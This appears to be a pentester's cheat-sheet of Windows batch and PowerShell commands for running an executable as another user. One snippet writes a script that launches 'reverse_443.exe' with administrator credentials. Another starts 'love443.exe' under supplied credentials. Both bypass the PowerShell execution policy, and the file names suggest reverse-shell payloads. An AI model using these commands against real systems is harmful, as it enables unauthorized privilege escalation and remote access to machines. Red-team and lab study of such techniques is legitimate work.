echo $secpasswd = ConvertTo-SecureString ^"PASSWORD^" -AsPlainText -Force > run.ps1
echo $mycreds = New-Object System.Management.Automation.PSCredential(^"administrator^",$secpasswd)  >> run.ps1
echo $computer = ^"WIN7^"  >> run.ps1
echo [System.Diagnostics.Process]::Start(^"C:\temp\reverse_443.exe^", $mycreds.Username, $mycreds.Password, $computer)  >> run.ps1

powershell -ExecutionPolicy Bypass -File C:\temp\run.ps1

=====

$username = 'user'
$password = 'pass'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process C:\Users\Public\love443.exe -Credential $credential

powershell -ExecutionPolicy Bypass -File runas.ps1

